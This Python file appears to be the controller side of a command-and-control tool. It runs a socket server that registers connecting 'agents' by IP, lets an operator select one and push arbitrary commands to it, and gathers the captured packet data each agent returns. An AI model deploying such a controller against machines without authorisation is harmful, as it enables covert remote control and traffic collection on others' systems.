import socket, json, os
import threading
from agent import Agent

HOST = '10.0.0.1'
PORT = 5000

def input_thread():
    help_mes = "\
        +---------------------------------+\n\
        |commands| explanation            |\n\
        +--------+------------------------+\n\
        |list    | List available agents  |\n\
        |select  | Select an agent        |\n\
        |help    | Show help message      |\n\
        |exit    | Leave program          |\n\
        +---------------------------------+\n\
    "

    selected_agent = {'None':None}
    states = []
    while True:
        s = input('[{}] '.format(list(selected_agent.keys())[0]))
        if s=='list':
            print("Available agents:")
            print(' '.join(s for s in agentList.keys()))
            states = []
        elif 'select' in s:
            tl = s.split(' ')
            if len(tl) != 2:
                print("Usage: select [IP]")
            else:
                s = tl[1]
                try:
                    selected_agent = {s:agentList[s]}
                    print("Select success")
                    states = ['wait_for_command']
                except KeyError:
                    print("Agent not in list, enter again")
        elif s=='help':
            print(help_mes)
        elif s=='exit':
            print("Bye~")
            os._exit(0)
        elif 'wait_for_command' in states:
            agent_tmp = list(selected_agent.values())[0]
            try:
                agent_tmp.send_mes(s)
            except BrokenPipeError:
                # Connection lost, delete the agent
                print("Connection lost, delete agent")
                del agentList[list(selected_agent.keys())[0]]
                states = []
        else:
            print(help_mes)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((HOST, PORT))
s.listen(5)

ithread = threading.Thread(target=input_thread)
ithread.start()

agentList = {}


while True:
    conn, addr = s.accept()
    agent = Agent(conn, addr)
    agentList.update({addr[0]:agent})
    print('[+] Agent {} Connected'.format(addr))

    while True:
        data = conn.recv(1024).decode()
        if len(data) == 0:
            break
        try:
            datas = [s for s in data.split('\n')]
            for data in datas:
                if len(data) != 0:
                    data = json.loads(data)
                    if 'packet' in data:
                        agent.add_pkt(data['packet'])
                    else:
                        print(data)
        except Exception as e:
            pass

ithread.join()
